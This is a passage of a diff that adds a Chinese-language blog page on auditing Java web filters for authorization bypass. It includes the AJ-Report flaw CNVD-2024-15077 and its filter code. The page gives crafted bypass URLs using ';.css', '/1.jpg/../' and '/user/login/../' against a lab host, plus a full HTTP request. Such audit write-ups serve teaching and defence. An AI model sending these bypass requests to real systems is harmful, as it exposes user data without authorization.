+</span></span><span class="line"><span class="cl">    <span class="err">private</span> <span class="err">String</span><span class="p">[]</span> <span class="err">allowUrls;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">private</span> <span class="err">String</span><span class="p">[]</span> <span class="err">ignoredUrls;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="第二处ignoredurl表示不走过滤器的url值为当请求url中存在后缀名为cssjsjpgpnggifico"><strong>第二处：ignoredUrl表示不走过滤器的url，值为当请求url中存在后缀名为</strong><code>.css#.js#.jpg#.png#.gif#.ico</code><strong><font style="color:#DF2A3F;">这些文件后缀，那么直接放行</font></strong>
+</h4><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/12.png"
+	width="2459"
+	height="643"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/12_hu_7f3c5118f1c01570.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/12_hu_4c3cb72aab5f3765.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="917px"
+	
+></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/13.png"
+	width="2476"
+	height="927"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/13_hu_77341ae247752e5d.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/13_hu_f09d3e4cdcfed645.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="641px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">http:</span><span class="c1">//192.168.165.252:8082/1.jpg/../user/getUserList?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D&amp;currentPage=1&amp;pageSize=15
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="err">http:</span><span class="c1">//192.168.165.252:8082/user/getUserList;.css?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D&amp;currentPage=1&amp;pageSize=15
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>使用;.css或者/1.jpg/../进行绕过</code></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/14.png"
+	width="2453"
+	height="819"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/14_hu_f8a6649b70b1d82f.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/14_hu_1adb67ae29a1eeee.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="299"
+		data-flex-basis="718px"
+	
+></p>
+<h4 id="第三处filterpath特定允许路径通过-filterpath-参数配置如-userlogin-userregisteruser可能用于开放某些接口或页面的访问权限">第三处：filterPath**特定允许路径：通过 **<code>filterPath</code> 参数配置（如 <strong><code>/user/login</code></strong>, <strong><code>/user/registerUser</code></strong>），可能用于开放某些接口或页面的访问权限。
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">GET</span> <span class="err">/user/login/../getUserList?search=%</span><span class="mi">7</span><span class="err">B%</span><span class="mi">22</span><span class="err">userName%</span><span class="mi">22</span><span class="err">%</span><span class="mi">3</span><span class="err">A%</span><span class="mi">22</span><span class="err">%</span><span class="mi">22</span><span class="err">%</span><span class="mi">2</span><span class="err">C%</span><span class="mi">22</span><span class="err">loginName%</span><span class="mi">22</span><span class="err">%</span><span class="mi">3</span><span class="err">A%</span><span class="mi">22</span><span class="err">%</span><span class="mi">22</span><span class="err">%</span><span class="mi">7</span><span class="err">D&amp;currentPage=</span><span class="mi">1</span><span class="err">&amp;pageSize=</span><span class="mi">15</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="mf">192.168</span><span class="err">.</span><span class="mf">165.252</span><span class="err">:</span><span class="mi">8082</span>
+</span></span><span class="line"><span class="cl"><span class="err">User-Agent:</span> <span class="err">Mozilla/</span><span class="mf">5.0</span> <span class="err">(Windows</span> <span class="err">NT</span> <span class="mf">10.0</span><span class="err">;</span> <span class="err">Win</span><span class="mi">64</span><span class="err">;</span> <span class="err">x</span><span class="mi">64</span><span class="err">;</span> <span class="err">rv:</span><span class="mf">139.0</span><span class="err">)</span> <span class="err">Gecko/</span><span class="mi">20100101</span> <span class="err">Firefox/</span><span class="mf">139.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept:</span> <span class="err">application/json,</span> <span class="err">text/javascript,</span> <span class="err">*/*;</span> <span class="err">q=</span><span class="mf">0.01</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Language:</span> <span class="err">zh-CN,zh;q=</span><span class="mf">0.8</span><span class="err">,zh-TW;q=</span><span class="mf">0.7</span><span class="err">,zh-HK;q=</span><span class="mf">0.5</span><span class="err">,en-US;q=</span><span class="mf">0.3</span><span class="err">,en;q=</span><span class="mf">0.2</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding:</span> <span class="err">gzip,</span> <span class="err">deflate,</span> <span class="err">br</span>
+</span></span><span class="line"><span class="cl"><span class="err">X-Requested-With:</span> <span class="err">XMLHttpRequest</span>
+</span></span><span class="line"><span class="cl"><span class="err">Connection:</span> <span class="err">close</span>
+</span></span><span class="line"><span class="cl"><span class="err">Referer:</span> <span class="err">http:</span><span class="c1">//192.168.165.252:8082/pages/manage/user.html
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/15.png"
+	width="2498"
+	height="854"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/15_hu_6fd8704f6683c8cd.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/15_hu_98079bb8d5498215.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="702px"
+	
+></p>
+<h3 id="34aj-report鉴权漏洞cnvd-2024-15077">3.4.AJ-Report鉴权漏洞（CNVD-2024-15077）
+</h3><p><strong>查看pom.xml文件发现没有使用鉴权框架，也没有使用JWT，从代码中可以看到使用了Filter过滤器做鉴权</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/16.png"
+	width="2231"
+	height="1124"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/16_hu_59383fe15fc9b2dc.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/16_hu_994bacde0abaa723.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<p><strong>从代码中可以看到swagger相关的直接放行，并且使用了</strong><code>contains</code><strong>这个函数</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// TODO 暂时先不校验 直接放行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/*if (true) {
+</span></span></span><span class="line"><span class="cl"><span class="cm">            filterChain.doFilter(request, response);
+</span></span></span><span class="line"><span class="cl"><span class="cm">            return;
+</span></span></span><span class="line"><span class="cl"><span class="cm">        }*/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//OPTIONS直接放行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;OPTIONS&#34;</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getMethod</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// swagger相关的直接放行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;swagger-ui&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">uri</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;swagger-resources&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SLASH</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">SLASH</span><span class="p">.</span><span class="na">concat</span><span class="p">(</span><span class="n">BusinessConstant</span><span class="p">.</span><span class="na">SLASH</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">uri</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">BusinessConstant</span><span class="p">.</span><span class="na">SLASH</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">uri</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="s">&#34;/index.html&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="n">SLASH</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;/index.html&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 不需要token验证和权限验证的url，直接放行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">skipAuthenticate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">skipAuthenticatePattern</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">uri</span><span class="p">).</span><span class="na">matches</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">skipAuthenticate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//获取token</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&#34;Authorization&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//针对大屏分享，优先处理</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">shareToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&#34;Share-Token&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isBlank</span><span class="p">(</span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isBlank</span><span class="p">(</span><span class="n">shareToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">error</span><span class="p">(</span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 判断token是否过期</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">loginName</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">loginName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtBean</span><span class="p">.</span><span class="na">getUsername</span><span class="p">(</span><span class="n">token</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">loginName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">tokenKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">BusinessConstant</span><span class="p">.</span><span class="na">GAEA_SECURITY_LOGIN_TOKEN</span><span class="p">,</span><span class="w"> </span><span class="n">loginName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">userKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">BusinessConstant</span><span class="p">.</span><span class="na">GAEA_SECURITY_LOGIN_USER</span><span class="p">,</span><span class="w"> </span><span class="n">loginName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">cacheHelper</span><span class="p">.</span><span class="na">exist</span><span class="p">(</span><span class="n">tokenKey</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//代表token过期</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isNotBlank</span><span class="p">(</span><span class="n">shareToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//需要处理</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//  /reportDashboard/getData</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//  /reportDashboard/{reportCode}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//  /reportExcel/preview</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">reportCodeList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JwtUtil</span><span class="p">.</span><span class="na">getReportCodeList</span><span class="p">(</span><span class="n">shareToken</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">uri</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&#34;/reportDashboard/getData&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">uri</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&#34;/reportExcel/preview&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">reportCodeList</span><span class="p">.</span><span class="na">stream</span><span class="p">().</span><span class="na">noneMatch</span><span class="p">(</span><span class="n">uri</span><span class="p">::</span><span class="n">contains</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ResponseBean</span><span class="w"> </span><span class="n">responseBean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ResponseBean</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">code</span><span class="p">(</span><span class="s">&#34;50014&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">message</span><span class="p">(</span><span class="s">&#34;分享链接已过期&#34;</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">print</span><span class="p">(</span><span class="n">JSONObject</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">responseBean</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">error</span><span class="p">(</span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">gaeaUserJsonStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cacheHelper</span><span class="p">.</span><span class="na">stringGet</span><span class="p">(</span><span class="n">userKey</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 判断用户是否有该url的权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">BusinessConstant</span><span class="p">.</span><span class="na">USER_ADMIN</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">loginName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AtomicBoolean</span><span class="w"> </span><span class="n">authorizeFlag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authorize</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">gaeaUserJsonStr</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">authorizeFlag</span><span class="p">.</span><span class="na">get</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">authError</span><span class="p">(</span><span class="n">response</span><span class="p">);</span><span class="c1">//无权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 延长有效期</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cacheHelper</span><span class="p">.</span><span class="na">stringSetExpire</span><span class="p">(</span><span class="n">tokenKey</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">,</span><span class="w"> </span><span class="n">3600</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cacheHelper</span><span class="p">.</span><span class="na">stringSetExpire</span><span class="p">(</span><span class="n">userKey</span><span class="p">,</span><span class="w"> </span><span class="n">gaeaUserJsonStr</span><span class="p">,</span><span class="w"> </span><span class="n">3600</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//执行</span><span class="w">
